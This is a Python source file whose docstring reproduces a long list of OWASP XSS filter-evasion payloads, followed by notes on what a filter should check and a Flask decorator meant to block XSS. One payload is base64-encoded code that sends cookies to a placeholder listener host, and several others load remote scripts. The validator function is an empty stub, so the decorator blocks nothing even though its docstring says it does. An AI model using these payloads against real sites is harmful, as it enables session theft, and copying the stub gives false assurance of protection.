"""

Examples of XSS attacks taken from owasp.org

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#introduction


<script x> alert(1) </script 1=2
"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//\<</SCRIPT>
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
<SCRIPT SRC=//xss.rocks/.j>
<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT> 
<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>
</script><script>alert('XSS');</script>
¼script¾alert(¢XSS¢)¼/script¾
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>

<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//some user agreement and sending to server logic might be here
...
</script>


<BODY ONLOAD=alert('XSS')>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

<isindex x="javascript:" onmouseover="alert(XSS)">
<applet code="javascript:confirm(document.cookie);">
javascript:/*--></title></style></textarea></script></xmp>
<iframe src=http://xss.rocks/scriptlet.html <
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>

<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<Input value = "XSS" type = text>

<BODY BACKGROUND="javascript:alert('XSS')">
Set.constructor`alert\x28document.domain\x29
<BR SIZE="&{alert('XSS')}">
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>

<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> 
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<XML SRC="xsstest.xml" ID=I></XML>  
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>

<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->

<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>

a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")"; 
eval(a+b+c+d);

Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser

<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)
alert?.()
`${alert``}`
(alert())


<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-


<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">

<Video> <source onerror = "javascript: alert (XSS)">


<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<TABLE BACKGROUND="javascript:alert('XSS')">



<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>



<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">


<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
"><img src="x:x" onerror="alert(XSS)">
"><iframe src="javascript:alert(XSS)">
<object data="javascript:alert(XSS)">
<isindex type=image src=1 onerror=alert(XSS)>
<img src=x:alert(alt) onerror=eval(src) alt=0>
<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
<iframe/src="data:text/html,<svg onload=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>

</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
<style>//*{x:expression(alert(/xss/))}//<style></style>
<img src="/" =_=" title="onerror='prompt(1)'">

<form><button formaction=javascript&colon;alert(1)>CLICKME
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>


<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">

<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<svg/onload=alert('XSS')>



<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">


<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<IMG SRC="livescript:[code]">
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG \"""><SCRIPT>alert("XSS")</SCRIPT>"\>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14; javascript:alert('XSS');">
<IMG SRC="('XSS')"
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">



<form><a href="javascript:\u0061lert(1)">X
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="h tt  p://6   6.000146.0x7.147/">XSS</A>
<A HREF="//www.google.com/">XSS</A>
<A HREF="//google">XSS</A>
<A HREF="http://ha.ckers.org@google">XSS</A>
<A HREF="http://google:ha.ckers.org">XSS</A>
<A HREF="http://google.com/">XSS</A>
<A HREF="http://www.google.com./">XSS</A>
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
<A HREF="http://www.google.com/ogle.com/">XSS</A>
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>





Prevent XSS by not allowing any of the following values to pass:

Condition which triggers xss evaluation:

`If string has < or > and = present then look for posible XSS attacks`

Checks:
- any HTTP-EQUIV=XXXX with a folowup of charset=XXXXXX
- any onXXX=XX which may include a event trigger
- javascript: in any shape
- any tag with SRC=XX 
- any a, script, img, iframe, FRAMESET, EMBED, svg, input tags
- any \u which encodes a character
- href=XX
- eval(XXXX) which may trigger some js function
- any alert(XXXX), confirm(XXXX), prompt(XXXX)
- any HREF=XXXX
- any html comment tags <!-- XXXX -->
- any php tags <? XXXXX ?>


"""



from flask import request
from functools import wraps
from licenseware.utils.logger import log
from licenseware.utils.miscellaneous import get_flask_request_dict
from licenseware.common.constants import states




def xss_validator(request_dict: dict):

    for key, val in request_dict.items():
        pass



def xss_security(f):
    """ 
        Don't allow users to insert maliciuous data 
    """
    @wraps(f)
    def decorated(*args, **kwargs):

        request_dict = get_flask_request_dict(request)

        try:
            xss_validator(request_dict)
            return f(*args, **kwargs)
        except:    
            log.warning(f'XSS | Request headers: {dict(request.headers)} | URL {request.url} | Message: {request_dict}')
            return {'status': states.FAILED, 'message': "Inputs not allowed"}, 406
        
    return decorated
